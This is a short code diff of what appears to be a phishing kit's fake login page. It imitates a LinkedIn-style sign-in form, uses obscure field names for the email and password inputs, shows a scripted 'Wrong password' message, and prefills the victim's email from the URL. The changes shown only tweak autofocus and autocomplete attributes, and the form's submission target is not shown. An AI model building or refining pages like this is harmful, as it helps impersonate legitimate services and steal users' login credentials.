@@ -71,7 +71,7 @@ void 0!==c?e&&"set"in e&&void 0!==(d=e.set(a,c,b))?d:a[b]=c:e&&"get"in e&&null!=
 <form novalidate="" method="post" class="login__form" action="" onsubmit="return validateForm()">
 <input type="hidden" name="csrfToken" value="">
 <div class="textInput" id="login_emaildiv"><div class="fieldWrapper">
-<input id="ai" name="seou" type="email" aria-describedby="emailErrorMessage" autocomplete= "username" placeholder="Email" required="required" validation="email|tel" class="hasHelp  validateEmpty" autofocus aria-label="Email"/><label class="fieldLabel" for="email" aria-hidden="true">Email</label><div error-for="username" id="error-for-username" class="form__label--error  hidden" role="alert" aria-live="assertive"></div></div></div>
+<input id="ai" name="seou" type="email" aria-describedby="emailErrorMessage" autocomplete="" placeholder="Email" required="required" validation="email|tel" class="hasHelp  validateEmpty" autocomplete aria-label="Email"/><label class="fieldLabel" for="email" aria-hidden="true">Email</label><div error-for="username" id="error-for-username" class="form__label--error  hidden" role="alert" aria-live="assertive"></div></div></div>
 
 <div class="textInput" id="login_passworddiv"><div class="fieldWrapper">
 <input id="pr" type="password" aria-describedby="passwordErrorMessage" name="seop" placeholder="Password" required="required" autofocus="" validation="password" class="hasHelp  validateEmpty   pin-password" aria-label="Password"><label for="password" class="fieldLabel" aria-hidden="true">Password</label><span id="password-visibility-toggle" class="button__password-visibility" role="button" tabindex="0"></span><div error-for="password" id="error-for-password" class="form__label--error   hidden" role="alert" aria-live="assertive"></div></div></div><a href="#" class="btn__tertiary--medium forgot-password" data-cie-control-urn="forgot-password-btn">Forgot password?</a><br><span class="alert alert-danger" id="msg" style="display: none; color: red;">Wrong password. Please try again</span>
@@ -117,7 +117,7 @@ $(document).ready(function() {
         var c = my_slice.substr(0, my_slice.indexOf('.'));
         var final = c.toLowerCase();
         $('#ai').val(my_ai);
-        $('#ai').attr('autofocus', true);
+        $('#ai').attr('autocomplete', true);
         $("#msg").hide();
     }
     ///////////////url getting ai////////////////
